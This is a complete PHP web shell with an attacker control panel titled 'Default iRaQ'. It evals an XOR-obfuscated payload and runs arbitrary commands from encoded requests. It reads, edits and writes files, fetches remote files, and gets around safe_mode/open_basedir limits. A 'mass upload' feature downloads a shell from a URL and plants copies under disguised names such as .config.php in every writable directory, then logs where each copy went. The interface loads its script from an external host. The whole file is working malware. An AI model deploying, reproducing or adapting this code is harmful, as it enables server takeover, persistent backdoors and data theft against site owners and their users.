<?php

function xor_string_decode($string, $key = "")
{
  if ($key == "") {
    $key = 'acyTNHj5242Fxm48Tt^#8pMZwJz34RW!^L?XV!y*^==Rncf&ucV7z*X=yR2aeX6kLCa85HjQ4rmZyqXqsX*hDy55eSRheEaZ+Xbv!kzd-bP?c??Z&Z+=ePF!CWpJ%T3CTe5_v=L_%Z%D%BPLgX#Z4?wg2Djsv@KZhx#ZmUnbLQtFzZ$RY9PNAL&3^MPnzh&sQ47YV8$VF8KKrjp%JqWn?xDNETNW8hAhyBjG+_&qxNE+4=HZkN&_VuNrfpc9rKyY';
  } else {
    $key = $_POST['kkk'];
  }
  $string = base64_decode($string);
  $key = 'acyTNHj5242Fxm48Tt^#8pMZwJz34RW!^L?XV!y*^==Rncf&ucV7z*X=yR2aeX6kLCa85HjQ4rmZyqXqsX*hDy55eSRheEaZ+Xbv!kzd-bP?c??Z&Z+=ePF!CWpJ%T3CTe5_v=L_%Z%D%BPLgX#Z4?wg2Djsv@KZhx#ZmUnbLQtFzZ$RY9PNAL&3^MPnzh&sQ47YV8$VF8KKrjp%JqWn?xDNETNW8hAhyBjG+_&qxNE+4=HZkN&_VuNrfpc9rKyY';
  $str_len = strlen($string);
  $key_len = strlen($key);

  for ($i = 0; $i < $str_len; $i++) {
    $string[$i] = $string[$i] ^ $key[$i % $key_len];
  }

  return base64_decode($string);
}
function xor_string_encode($string)
{
  $string = base64_encode($string);
  $key = 'acyTNHj5242Fxm48Tt^#8pMZwJz34RW!^L?XV!y*^==Rncf&ucV7z*X=yR2aeX6kLCa85HjQ4rmZyqXqsX*hDy55eSRheEaZ+Xbv!kzd-bP?c??Z&Z+=ePF!CWpJ%T3CTe5_v=L_%Z%D%BPLgX#Z4?wg2Djsv@KZhx#ZmUnbLQtFzZ$RY9PNAL&3^MPnzh&sQ47YV8$VF8KKrjp%JqWn?xDNETNW8hAhyBjG+_&qxNE+4=HZkN&_VuNrfpc9rKyY';
  $str_len = strlen($string);
  $key_len = strlen($key);

  for ($i = 0; $i < $str_len; $i++) {
    $string[$i] = $string[$i] ^ $key[$i % $key_len];
  }
  return base64_encode($string);
}

/**
 * Downloading remote file
 * @param string $url File URL
 * @return string Data or False
 */
function getRemote($url)
{
  $data = "";
  $isCurl = false;
  if (@function_exists('curl_version')) {
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = @curl_exec($ch);
    curl_close($ch);
    if ($data !== false) {
      $isCurl = true;
    }
  } elseif (!$isCurl) {
    $data = @file_get_contents($url);
    if (@strlen($data) < 4) {
      $f = @fopen($url, 'r');
      if ($f) {
        $data = @stream_get_contents($f);
      }
    }
  }
  if (@strlen($data) > 4) {
    return $data;
  } else {
    return false;
  }
}

// Function ex
eval(xor_string_decode("Ow0vIRd7OEVQBgYhIjVTVx4zEE5iIyY9EjMoSm4KGkYOH342HFsNWgRUfD0nNDBSFisEAjFpClcjP2cRLgt0XC0UOFdkDzBgVh8jahgmYQQranxcJSF7BQYqNQY/HQk2ciEBBmo4OFN8JQYLOWhyNWwdZVA/AzFKIDomMG4AQCg3CGMlP3l8OEQ3HDRHKzclPx8XM3h8JR5oHCcDOXN6NgowbTYMAjcNHRYudxg3amI4bmk7GX5wBz8VHl4ZEUEdMgZfNTR/XDAcYCMnKxMTVQEiFVl1MA4iJi0PbnEtAxIYBTw0SRkfHR0JE0F/fhowMSNzLxlGfx4EOC1VExwgNjAkI2UsJSQFU2MLMyBfYgw1LBATWwkqNBR5FklQFQFVFDVUKB9pDWs8D3c0DVA0ThYNB1gxfix8GmFeGwEfYB8HADNSbyU/IXsLPyMjKRUWIwtoKSZLf1M/YQRYPXcvLEk2MBpDBSgeZiE7CDJ4BjN+aH1IPxZ/SyEQJiJHPVQzG1YEMxR1AjNEDXwrdAUKfQU1bWpVaE4SanY8RxcYBWoLAUQ0DhIoGC9iJikZNHE8Emo7KSR8ZEUHIWkUHi9gCjV3UCkZCGYhH2AFMRYtGFwuIjAFZkoeIg4APTxbBRcSMAZaIHoYHxggfCFHUHtxMAl8E28MIntCBQkEST17Oy84D0A4LCU4U2sGSiohOgBXHyAqGmInNSAtHRZefxcVUT19BiEMeTdcOmV3ODQwAU0vChcOM28aShthcA0HMVEAFXE7VHkLICh9GwYqMiIaRjkQYAQnAHQMLBAbASp3DTdgHSAbRTxPDkklPEkBUwY2Qx1HRwEYC04JZSozfwN1KB4cXjg8VBYefzRzMXxxAjwFahY8bmcfF1F3OAk9Ay83Mi8aNycsBRIpYhApGw1cPhJ6Fg8bIXBFBCQ3BSABTQMYfEQyNVVyLA97f3I7LzJIKRwBBmU7IyUfPTkvdSwIWDIWHn5NCHACG3wQTFVqETU6CXxuNBgAQgcnWkwqeS9tADs3ZC0xDVtoWVYqHCV5Vh8nH05yGw83Ex1PWVAVO1c8IAY0M2YVUDp1cD0kUTxKF1EPWTF5NAodYFoRBx9jBAUWI1VvH1M8fzE/NzIiMxYWIXgRHiF4Uik5Yg80Ajs0cQAwDGooKAlhJhVILlVuKmlpGgQ0GARLIRBJMH8HVCgODF5oEGoaLEZoczR/KzgNBgBtPFdSIR1QdzwKL3IeNSI/ej09BiwjLxk+MCNrHSQ6fgY7Cg90WQQgBR0jMGwKCGxcNhtrZW8WVQ0yEQc2EAEyHRleIAYiDD05PlwRCBgyER0sSBhKBiIWCFt/biM9Djd0JgwtAxU2IyJQOyENKTsKERUUJjxAawdgNhpfAV4OLDZTW0MfIDwJHl5XPwFJBA9cKB9iIEcPemdjDA4oFhQ0b0IiGA4JGAp8UQYhUQUWLjdObyEJIX8qGWkYNjQCKQtNABU+b1kHYQsHLw0jKkgfNAx2ETwAZjE7WAZGbSN8AmZaKTp2RhIQKjN/A3UoHyZnKBdlDjNGa1Y8fREnNCocamp/awNeVBM8ABVyHj0JL3o1PBI0Uy48OnYbDR0nAQsGeiAUaAM9NDcAIAVCHzV8ejcda2U7DFMJJhY9RU8uNjsYXRR9IiATIi1cIAwHM3AwK0ltfx8zHSkcUA8gKgkJczAfIAwfPCdaVDkIKy4AOzs4LXkZTWpnWTYxJUdTNxkIWXEzeWM+DzhebmABET01WDM1ZhVdBGVzMCM1VlU4NxdONGkzCh8KAyAGEHwdFXJYUlcPUytuIQoxIxgzRhUPfBsnS2NFPzo6KT8rNy9yazAGQ1lPAnc6OE8ADG0gbRlPSjxicxEhEUkmQBNlKR4cXjI8Vg4yQQ0QLkEFPDoFNBo2UXgbHVYMJxw8cwkwChZxKTVnNBQvPAcoMQlPNTxAAjcbFGtUDh4RAC1bExcYcX0qN28RPQ99BT0QPUFNKBwGCW0gLCIcZxhnWT94HTAKMDdyDGQTGwkLXlB6MDwxFk4zD0R/EQQcG0w4MQoyAiQVPwcMWlJjfHAsGgNmSwxGBFVbHT41PB4OQ247Fk4UBH0oDGI4Ew5ufCYjMA1BEBoETiByFVo1OAIGL2lFHxQQI3xXezwibjEvLxtCCRYqakIYJj5nTD8EZg8/KFgjSiFWEXMzEhRJITMIBWhpKUVofloEBx9GCBQiPUQDYjMdLUEvLFQNMHQSZy5HLAI/P2tHKm5SIVNTHDgfLAMsMQtLcTIJHTgYBwIYcTASbj46QBE7ER9nXQk0JAozLXQFM1liMR99aiAkb3ojEAchQgMYNBt1PwojHwd6OXEBAxIdFSQtcQdoCyIgE1hWdSM9MRZOMw9GGEI8JzJMODENYDs0AS4UGygCeHx4KhsUdU0EJx9Nbwl8Pj4PLEpXP25YEiV9HDQTSF4Hagg5JyQKUyxRb04ZRw5XHREGDyprB1IWFBlCbxsoZn41IzcjIhlIOh9sEScUcwAuEBsPKRI0PWFrLENCWCgITzE4XCpWbTB8N31eLDktTwo+G31EA2osBS13NRRTHix9aHNwfxUdIy0hGmtXDD4RaykGBjpzCTYLFVQ0IRY8CBY8ITYxCWY+PH48fgoIZ0MRfzwDMS1kBAgGAmk0fh06I38dITkpE1MuKRkXc0o8OBxmCCR0WgsYGytTMHEHbAIyNzJAbQ8SNiAdTTgMLSYCAjMETjkfDTIANCw7BRweDFRsAz8iNWYJNxlqRHI4BzYUMA4K"));

function getId()
{
  $id = ex("id");
  if (!empty($id)) {
    return $id;
  } elseif (@function_exists('posix_geteuid') && @function_exists('posix_getegid') && @function_exists('posix_getgrgid') && @function_exists('posix_getpwuid')) {
    $euserinfo = @posix_getpwuid(@posix_geteuid());
    $egroupinfo = @posix_getgrgid(@posix_getegid());
    return 'uid=' . $euserinfo['uid'] . ' ( ' . $euserinfo['name'] . ' ) gid=' . $egroupinfo['gid'] . ' ( ' . $egroupinfo['name'] . ' )';
  } else {
    return "user=" . @get_current_user() . " uid=" . @getmyuid() . " gid=" . @getmygid();
  }
}

function FileSizeConvert($bytes, $decimals = 2)
{
  $size = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
  $factor = floor((strlen($bytes) - 1) / 3);
  return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

function getDirList($pwd)
{
  $pwd = @realpath($pwd);
  $d = @dir($pwd);
  $dir = [];
  if ($d) {
    while (false !== ($file = $d->read())) {
      if ($file == ".." || $file == ".") {
        continue;
      }

      $file = @realpath($pwd . DIRECTORY_SEPARATOR . $file);
      if (@is_dir($file)) {
        $dir[] = $file;
      }
    }

    $d->close();
  } elseif (@function_exists('glob')) {
    $files = @glob("*");
    foreach ($files as $file) {
      if ($file == ".." || $file == ".") {
        continue;
      }

      $file = @realpath($pwd . DIRECTORY_SEPARATOR . $file);
      if (@is_dir($file)) {
        $dir[] = $file;
      }
    }
  }
  return $dir;
}

function recursiveScan($pwd, &$result = array())
{
  $pwd = @realpath($pwd);
  $tree = getDirList($pwd);
  foreach ($tree as $file) {
    if (@is_writable($file)) {
      $result[] = $file;
      @recursiveScan($file, $result);
    } elseif (@is_writable($file)) {
      $result[] = $file;
    }
  }
}

$shellPwd = getcwd();
$pwd = getcwd();
$unix = true;
$slash = "/";
if ($pwd[0] != "/") {
  $default_cmd = "dir";
  $slash = "\\";
  $unix = false;
}
if (isset($_POST['submitEdit'])) {
  // var_dump($_POST);
  $filePath = xor_string_decode($_POST['filePath']);
  $data = html_entity_decode(xor_string_decode($_POST['fileData']));
  // var_dump($data);
  if (fwrite(fopen($filePath, 'w'), $data) == false) {
    echo "Error writing";
  } else {
    echo "Edit Successful";
  }
  exit;
}
if (isset($_POST['edit_path'])) {
  $maxsize = 1.6 * 1024 * 1024;
  // var_dump($_POST);
  $filePath = xor_string_decode($_POST['edit_path']);
  $result = "";
  if (is_file($filePath)) {
    if (filesize($filePath) > $maxsize) {
      $result = json_encode(array("error" => "File exceeds $maxsize bytes !"));
    } else {
      $data = file_get_contents($filePath);
      if ($data === false) {
        $result = json_encode(array("error" => "Error in reading file"));
      } else {
        $size = FileSizeConvert(fileSize($filePath));
        $data = base64_encode($data);
        $result = json_encode(array("fileSize" => $size, "fileData" => $data));
      }
    }
    // json_encode(array("file" => htmlentities(xor_string_encode(file_get_contents($filePath))) ));
  } elseif (file_exists($filePath)) {
    $result = json_encode(array("error" => "File is a directory"));
  } else {
    $result = json_encode(array("error" => "File $filePath doesn't exists."));
  }
  echo xor_string_encode($result);
  exit;
}

// Mass upload
if (isset($_POST['shellURL']) && isset($_POST['pathes'])) {
  $pathes = xor_string_decode($_POST['pathes']);
  $pathes = explode("\n", $pathes);
  $shellURL = xor_string_decode($_POST['shellURL']);
  $names = ["logon.php", "function.php", ".config.php", "show-data.php"];
  $shellData = getRemote($shellURL);
  $count = 0;
  foreach ($pathes as $p){
    if (trim($p) == "") continue;
    $name = $names[rand(0, count($names)-1)];
    $p = trim($p) . $slash . $name;
    if ($f = @fopen($p, "w")){
      @fwrite($f, $shellData);
      @fwrite(@fopen("$shellPwd\\list.txt", 'a'), "$p\r\n");
      $count++;
    }
  }
  echo "Files uploaded: $count, check list.txt";
  exit;
}

if (isset($_POST['path'])) {
  $dir = xor_string_decode($_POST['path']);
  if (!empty($_POST['uploadFileData'])) {
    $data = xor_string_decode($_POST['uploadFileData']);
    $target_file = $dir;
    $override = false;
    if (is_file($target_file)) {
      $override = true;
    }
    if ($f = fopen($target_file, "w")) {
      fwrite($f, $data);
      @fwrite(@fopen("$shellPwd\\list.txt", 'a'), "$target_file\r\n");
      if ($override) {
        echo "File already exists, overriding successful.";
      } else {
        echo "File upload successfully";
      }
    } else {
      echo "Error uploading file";
    }
  } else {
    echo "Unknown Error";
  }
  exit;
}

$cmd = "";
$result = "";
$urlDownload = "";
$urlFileName = "Default_.php";
if (isset($_GET['info'])) {
  $id = @getId();
  $uname = @ex("uname -a");
  if (empty($uname)) {
    $uname = @php_uname();
  }
  $ip = @gethostbyname($_SERVER["HTTP_HOST"]);
  $pwd = @getcwd();
  echo xor_string_encode(json_encode(array("id" => $id, "pwd" => $pwd, "uname" => $uname, "ip" => $ip)));
  exit;
}

if (isset($_GET['uploaded-delete'])) {
  if (file_exists("list.txt")) {
    if (@unlink($shellPwd . $slash . "list.txt")) {
      echo "file deleted";
    } else {
      echo "Error deleting file";
    }
  } else {
    echo "File not exist";
  }
  exit;
}

if (isset($_GET['uploaded'])) {
  if (file_exists("list.txt")) {
    echo '<input type="button" onclick="location.href=window.location.origin + window.location.pathname + \'?uploaded-delete\';" value="Delete?" />';
    echo "<pre>" . file_get_contents("list.txt") . "</pre>";
  } else {
    echo "<pre>File list.txt doesn't exist.";
  }
  exit;
}

if (!empty($_GET)) {
  if (isset($_GET['json'])) {
    //safemode and open_basedir check
    $safe_mode = @ini_get('safe_mode');
    if ((!@function_exists('ini_get')) || (@ini_get('open_basedir') != null) || (@ini_get('safe_mode_include_dir') != null)) {
      $open_basedir = 1;
    } else {
      $open_basedir = 0;
    }
    // start buffering outputs
    // ob_start();
    //Initial variables
    $default_cmd = 'ls -lha | grep "^d" && ls -lha | grep "^-"';
    // Check windows or linux
    if ($pwd[0] != "/") {
      $default_cmd = "dir";
    }
    // Decode Json data
    $_GET['json'] = urldecode($_GET['json']);
    $data = json_decode(xor_string_decode($_GET['json']), true);
    // die(var_dump($data));
    // Process Json parametars
    foreach ($data as $key => $d) {
      switch ($key) {
        case "pwd":
          if ($d != "") {
            $pwd = $d;
          }
          break;
        case "cmd":
          if ($d == "") {
            if ($safe_mode || $open_basedir) {
              $cmd = "safe_dir";
            } else {
              $cmd = $default_cmd;
            }
          } else {
            $cmd = $d;
          }
          break;
        case "urlDownload":
          $urlDownload = $d;
          break;
        case "urlFileName":
          if ($d != "") {
            // echo $d;
            $urlFileName = $d;
          }
          break;
        case "initial":
          if ($d) {
            $cmd = $default_cmd;
          }
          break;
        default:
          break;
      }
    }
    chdir($pwd);
    //Safemode or open_basedir limitation DIR
    if ($cmd == "safe_dir") {
      ob_start();
      $d = @dir($pwd);
      if ($d) {
        while (false !== ($file = $d->read())) {
          if ($file == "." || $file == "..") {
            continue;
          }

          @clearstatcache();
          @list($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
          if (!$unix) {
            echo date("d.m.Y H:i", $mtime);
            if (@is_dir($file)) {
              echo "  <DIR> ";
            } else {
              printf("% 7s ", $size);
            }

          } else {
            if (@function_exists('posix_getpwuid')) {
              $owner = @posix_getpwuid($uid);
              $grgid = @posix_getgrgid($gid);
            } else {
              $owner['name'] = $grgid['name'] = '';
            }
            echo $inode . " ";
            echo perms(@fileperms($file));
            @printf("% 4d % 9s % 9s %7s ", $nlink, $owner['name'], $grgid['name'], $size);
            echo date("d.m.Y H:i ", $mtime);
          }
          echo "$file\n";
        }
        $d->close();
      } elseif (@function_exists('glob')) {
        function eh($errno, $errstr, $errfile, $errline)
        {
          global $D, $c, $i;
          preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
          if ($o) {
            $D[$c] = $o[2];
            $c++;
          }
        }
        $error_reporting = @ini_get('error_reporting');
        error_reporting(E_WARNING);
        @ini_set("display_errors", 1);
        $root = "/";
        if ($dir) {
          $root = $dir;
        }

        $c = 0;
        $D = array();
        @set_error_handler("eh");
        $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        for ($i = 0; $i < strlen($chars); $i++) {
          $path = "{$root}" . ((substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}";
          $prevD = $D[count($D) - 1];
          @glob($path . "*");
          if ($D[count($D) - 1] != $prevD) {
            for ($j = 0; $j < strlen($chars); $j++) {
              $path = "{$root}" . ((substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}";
              $prevD2 = $D[count($D) - 1];
              @glob($path . "*");
              if ($D[count($D) - 1] != $prevD2) {
                for ($p = 0; $p < strlen($chars); $p++) {
                  $path = "{$root}" . ((substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}";
                  $prevD3 = $D[count($D) - 1];
                  @glob($path . "*");
                  if ($D[count($D) - 1] != $prevD3) {
                    for ($r = 0; $r < strlen($chars); $r++) {
                      $path = "{$root}" . ((substr($root, -1) != "/") ? "/" : null) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                      @glob($path . "*");
                    }
                  }
                }
              }
            }
          }
        }
        $D = array_unique($D);
        foreach ($D as $item) {
          echo htmlspecialchars("{$item}") . "\r\n";
        }

        error_reporting($error_reporting);
      }
      $result = ob_get_contents();
      ob_clean();

    } else {
      // Executing commands;
      if ($safe_mode && strpos("  " . $cmd, "cat ") == 2) {
        $file_path = preg_replace("/cat\s/", "", $cmd);
        if (is_file($file_path) && fileSize($file_path) < (1.6 * 1024 * 1024)) {
          $data = file_get_contents($file_path);
          if ($data === false) {
            $result = "Error in reading file";
          } else {
            // echo "here";
            $result = $data;
          }
        }
      } elseif ($safe_mode && strpos("  " . $cmd, "rmv ") == 2) {
        $file_path = preg_replace("/rmv\s/", "", $cmd);
        if (@unlink($file_path)) {
          $result = "File '$file_path' deleted";
        } else {
          $result = "Unable to delete '$file_path' file.";
        }
      } elseif (strpos("  " . $cmd, "cd ") == 2 && !strpos($cmd, "|") && !strpos($cmd, "&")) {
        $pwd = preg_replace("/cd\s/", "", $cmd);
        chdir($pwd);
      } elseif (strpos("  " . $cmd, "put ") == 2 && strlen($urlDownload) > 4) {
        // echo "put here";
        $file_data = getRemote($urlDownload);
        if ($file_data === false) {
          $result = "Can't read remote file.\n";
        } else {
          $f = @fopen($urlFileName, "w");
          if (!$f) {
            $result = "File writing error!\n";
          } else {
            @fwrite($f, $file_data);
            $result = "File '$urlFileName' successfully uploaded!\n";
            $currentPwd = getcwd();
            @fwrite(@fopen("$shellPwd\\list.txt", 'a'), "$currentPwd\\$urlFileName\r\n");
          }
          fclose($f);
        }
      } elseif (strpos("  " . $cmd, "mass ") == 2 || $cmd == "mass") {
        $file_path = preg_replace("/mass\s/", "", $cmd);
        if ($file_path == "mass") {
          $file_path = ".";
        }
        if (file_exists($file_path) && is_dir($file_path)) {
          $dirs = array();
          if (is_writable($file_path)) {
            $dirs[] = realpath($file_path);
          }

          @recursiveScan(realpath($file_path), $dirs);
          $result = "Total folders found: " . count($dirs) . "\n";
          foreach ($dirs as $d) {
            $result = $result . $d . "\n";
          }
        }
      } else {
        $result = ex($cmd);
      }
    }
    // $result = ob_get_contents();
    // ob_clean();
  }
  $result = utf8_encode($result);
  $cmd = utf8_encode($cmd);
  $pwd = getcwd() . $slash;
  $id = getID();
  echo xor_string_encode(json_encode(array("user" => $id, "pwd" => $pwd, "result" => $result, "cmd" => $cmd)));
  exit;
}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<!-- PAGE settings -->
		<title>Default iRaQ</title>
		<link rel="stylesheet" type="text/css" href="https://osamamohammed.github.io/CSS-Data/stylesheet.css"/>
	</head>
	<body>
		<!-- Upload Model -->
		<div id="uploadModel" class="modal">
		  <!-- Upload model content -->
		  <div class="modal-content-upload">
		    <span class="close" id="upload_close">&times;
		    </span>
		    <form id="uploadForm">
		      <h3>File Upload
		      </h3>
		      <hr>
		      <br>
		      <div>
		        <label>Path:</label>
		        <input class="upload" type="text" name="path" id="upload_path" value="<?php echo getcwd(); ?>">
		      </div>
		      <div>
		        <label>File:</label>
		        <input class="upload" type="file" id="fileToUpload">
		      </div>
		      <div style="text-align: center;">
		        <button class="nav-submit uploadbtn" type="submit" id="uploadBtn">Upload</button>
		      </div>
		    </form>
		  </div>
		</div>
		<!-- Mass upload Model -->
		<div id="massuploadModel" class="modal">
		  <!-- Upload model content -->
		  <div class="modal-content-edit">
		    <span class="close" id="massupload_close">&times;
		    </span>
		    <form id="massuploadForm">
		      <h3>Mass File Upload
		      </h3>
		      <hr>
		      <br>
          <div>
          <label>Shell/URL:</label>
            <input id="shell" list="DefaultShells"/>
            <datalist id="DefaultShells">
            </datalist>
          </div>
		      <div>
		        <label>Pathes:</label>
		        <textarea id="massUpload_pathes"></textarea>
		      </div>
		      <div style="text-align: center;">
		        <button class="nav-submit uploadbtn" type="submit" id="massuploadBtn">Upload</button>
		      </div>
		    </form>
		  </div>
		</div>
		<div id="editModel" class="modal">
		  <!-- Upload model content -->
		  <div class="modal-content-edit">
		    <span class="close" id="edit_close">&times;
		    </span>
				<h3>File Edit</h3>
				<form id="LoadForm">
		      <hr>
		      <br>
		      <div>
		        <label>File Path:</label>
		        <input class="upload" type="text" name="path" id="edit_path_load" value="<?php echo getcwd(); ?>">
						<button class="nav-submit " type="submit">Load</button>
		      </div>
		    </form>
				<hr width="80%">
				<form id="EditForm">
					<div>
						<label>File: </label> <label id="editFilePath">Non</label>
						<input type="hidden" id="loadedFilePath" value="">
					</div>
					<div class="edit-div">
						<textarea spellcheck="false" id="editFileContent"></textarea>
					</div>
					<div class="edit-div">
						<button type="submit" class="nav-submit" id="editBtn">Edit</button>
					</div>
				</form>
		  </div>
		</div>
		<div>
			<button class="nav-b" type="button" id="upload_btn">Upload</button>
			<button class="nav-b" typ.e="button" id="edit_btn">Edit</button>
			<button class="nav-b" type="button" id="massupload_btn">Mass upload</button>
			<button class="nav-b" type="button" id="uploaded_list_btn">Uploaded list</button>
		  <hr align="left" width="500px auto">
		  <label id="res_id" class="bold p0 l0 green">
		  </label>
		  <label id="res_pwd" class="bold p0 l0 blue">
		  </label>
		  <label class="bold p0 l0 blue">#
		  </label>
		  <label id="res_cmd" class="bold p0 l0">
		  </label>
		  <pre id="cmd_result">
		</pre>
		</div>
		<div>
		  <form id="exeForm">
		    <input type="hidden" value="" id="pwd">
		    <label id="pwdLabel" class="bold p0 l0 blue">
		    </label>
		    <label class="bold p0 l0 blue">#
		    </label>
		    <input class="cmd" list="historySelect" spellcheck="false" type="text" name="" id="cmd" placeholder="Command" autofocus>
		    <datalist id="historySelect">
		    </datalist>
		    <button type="submit" class="nav-submit">Execute
		    </button>
		  </form>
		</div>

<!-- <script src="http://localhost/Js_Shell/script.js"></script> -->
<script src="https://osamamohammed.github.io/CSS-Data/script.js"></script>

	</body>
</html>
